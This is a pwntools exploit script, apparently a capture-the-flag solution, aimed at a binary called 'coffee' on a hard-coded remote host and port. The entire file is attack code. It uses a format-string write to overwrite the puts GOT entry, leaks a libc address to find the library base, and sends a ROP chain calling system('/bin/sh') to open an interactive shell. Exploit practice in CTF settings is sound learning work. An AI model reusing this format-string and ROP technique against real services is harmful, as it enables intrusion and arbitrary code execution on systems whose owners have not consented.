#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('./coffee')

host = args.HOST or '34.146.101.4'
port = int(args.PORT or 30002)

if not args.REMOTE:
    libc = exe.libc
else:
    libc = ELF('./libc.so.6')

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

whitespace = b'\f\t\r\n\v '
pop_rdi = exe.search(asm('pop rdi; ret')).__next__()
pop_sled = exe.search(asm('pop rbp; pop r12; pop r13; pop r14; pop r15; ret')).__next__()
offset  = 6

gdbscript = '''
tbreak main
b *0x401201
b *0x40128b
continue
'''.format(**locals())


# -- Exploit goes here --

p = start()

payload  = b''
payload += b'%29$018p'
payload += fmtstr_payload(offset+1,{exe.got.puts:pop_sled}, write_size='int', numbwritten=18)
fmtstr_len = len(payload) # padding for next rop chain
payload += p64(exe.sym._start)

p.sendline(payload)

libc.address = int(p.recv(18).decode(),16) - libc.sym.__libc_start_main - 243

log.info(f"libc base @ {hex(libc.address)}")

# capture the garbage
if args.REMOTE:
	null = payload.find(b'\x00')
	p.recvuntil(payload[null-2:null])
else:
	p.recvuntil(b'\n')

# 2nd pass
# get a shell
payload  = b''
payload += fmtstr_len * b'A'
payload += p64(pop_rdi)
payload += p64(libc.search(b"/bin/sh").__next__())
payload += p64(libc.sym.system)

if any(x in payload for x in whitespace):
	log.critical('whitespace in payload! exiting! try again!')
	sys.exit(1)

p.sendline(payload)
p.interactive()

